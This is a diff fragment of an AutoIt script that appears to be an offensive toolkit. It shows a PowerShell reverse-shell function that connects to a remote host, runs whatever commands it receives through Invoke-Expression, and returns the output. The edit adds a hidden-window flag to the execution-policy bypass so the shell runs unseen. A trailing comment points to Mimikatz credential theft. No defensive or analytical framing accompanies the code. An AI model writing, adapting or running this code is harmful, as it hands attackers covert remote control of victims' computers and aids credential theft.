@@ -8,7 +8,7 @@ EndFunc
 ;reverse shell using powershell
 Func ReverseShell($RemoteIp, $RemotePort)
    $buffer = "$client = [System.Net.Sockets.TCPClient]::new('" & $RemoteIp & "'," & $RemotePort & ");[byte[]]$bytes = (0..65535).ForEach{ 0 };$stream = $client.GetStream();while ($i = $stream.Read($bytes, 0, $bytes.Length)) {$data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);$prompt = $sendback + 'PS ' + $PWD.Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()"
-   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c " & " " & $buffer);
+   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
 EndFunc
 
 ;Mimikatz
